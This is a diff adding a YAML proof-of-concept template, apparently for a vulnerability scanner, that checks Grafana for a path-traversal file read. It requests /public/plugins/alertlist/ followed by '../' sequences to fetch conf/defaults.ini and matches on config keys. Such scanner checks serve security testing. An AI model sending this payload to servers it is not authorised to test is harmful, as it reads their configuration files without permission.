@@ -1,0 +1,10 @@
+name: poc-yaml-Grafana-Diretory
+description: "任意文件读取"
+method: GET
+path:
+  - /public/plugins/alertlist/../../../../../conf/defaults.ini
+expression:
+  status: 200
+  body_all:
+    - "http_port"
+    - "domain"
